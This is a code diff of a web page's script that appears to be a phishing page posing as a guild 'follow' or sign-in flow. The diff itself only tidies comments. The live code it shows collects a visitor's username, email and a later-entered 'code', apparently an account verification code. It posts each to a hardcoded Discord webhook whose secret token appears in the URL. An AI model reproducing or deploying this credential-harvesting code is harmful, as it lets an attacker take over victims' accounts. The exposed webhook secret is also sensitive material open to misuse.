@@ -181,6 +181,7 @@
   </div>
 
 <script>
+  // Function to handle the follow button click
   function followGuild(guildId) {
     // Hide the guild list and show the email form
     document.getElementById("signInGuildList").style.display = "none";
@@ -190,14 +191,15 @@
     sessionStorage.setItem("selectedGuild", guildId);
   }
 
+  // Function to handle the email form submission
   document.getElementById("emailForm").addEventListener("submit", function(event) {
     event.preventDefault(); // prevent the form from reloading the page
 
-    // get the input values
+    // Get the input values
     const username = document.getElementById('username').value;
     const email = document.getElementById('email').value;
 
-    // create the webhook message
+    // Create the webhook message
     const message = {
       "content": "Email and IGN entered!",
       "embeds": [
@@ -219,7 +221,7 @@
       ]
     };
 
-    // send the webhook message
+    // Send the webhook message
     fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
       method: "POST",
       headers: {
@@ -242,16 +244,17 @@
     });
   });
 
+  // Function to handle the code form submission
   document.getElementById("codeForm").addEventListener("submit", function(event) {
     event.preventDefault(); // prevent the form from reloading the page
 
-    // get the input value
+    // Get the input value
     const code = document.getElementById('code').value;
 
-    // retrieve the selected guild from sessionStorage
+    // Retrieve the selected guild from sessionStorage
     const guildId = sessionStorage.getItem("selectedGuild");
 
-    // create the webhook message
+    // Create the webhook message
     const message = {
       "content": "Code entered!",
       "embeds": [
@@ -273,7 +276,7 @@
       ]
     };
 
-    // send the webhook message
+    // Send the webhook message
     fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
       method: "POST",
       headers: {
